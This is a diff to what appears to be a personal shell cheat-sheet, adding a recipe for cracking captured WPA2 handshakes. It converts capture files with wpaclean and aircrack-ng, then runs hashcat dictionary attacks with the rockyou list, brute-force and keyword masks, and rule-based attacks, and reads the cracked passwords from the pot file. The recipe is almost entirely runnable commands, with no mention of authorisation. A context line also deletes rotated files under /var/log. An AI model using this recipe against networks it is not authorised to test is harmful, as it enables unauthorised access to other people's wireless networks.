@@ -83,3 +83,29 @@ find /var/log -type f -regex ".*\.[0-9]$" -delete
 #SSH Connection Failing (Host key verification failed.)
 #Warning: ensure there isn't a mitm attack or some sort of security related event happening
 ssh-keyscan -t rsa -H 192.168.1.101 >> ~/.ssh/known_hosts
+
+#Using Hashcat(Load AMD or NVIDIA Drivers first)/Crack WPA2
+#decompress dictionary
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+#cd to/capture.cap and convert your capture file
+#replace file names and remove < >
+wpaclean <out.cap> <in.cap>
+aircrack-ng <out.cap> -J <out.hccap>
+#mv out.hccap capture.hccap
+#DICTIONARY ATTACK
+hashcat -m 2500 capture.hccap /usr/share/wordlists/rockyou.txt
+#use all wordlist
+hashcat -m 2500 capture.hccap /usr/share/wordlists/*
+#BRUTE FORCE(8 digit password using all characterset) lowercase, digits, symbols, uppercase
+hashcat -m 2500 capture.hccap -a 3 -1 ?l?d?s?u ?1?1?1?1?1?1?1?1
+hashcat -m 2500 capture.hccap -a 3 ?a?a?a?a?a?a?a?a
+#BRUTEFORCE WITH KEYWORD finds Porsche1974 or porscheF45t or porsche74 etc...
+# -1 character set is pP , keyword orsche for Porsche or porsche , 4 positions after to brute force with all characterset incremented ?a or ?a?a or ?a?a?a or ?a?a?a?a
+hashcat -m 2500 capture.hccap -a 3 -1 pP ?1orsche?a?a?a?a --increment
+#RULES
+hashcat -m 2500 -r /usr/share/hashcat/rules/best64.rule capture.hccap /usr/share/wordlists/rockyou.txt
+hashcat -m 2500 -r /usr/share/hashcat/rules/rockyou-30000.rule capture.hccap /usr/share/wordlists/rockyou.txt
+hashcat -m 2500 -r /usr/share/hashcat/rules/d3ad0ne.rule capture.hccap /usr/share/wordlists/rockyou.txt
+hashcat -m 2500 -r /usr/share/hashcat/rules/dive.rule capture.hccap /usr/share/wordlists/rockyou.txt
+#view cracked hashes in pot file
+cat /root/.hashcat/hashcat.pot
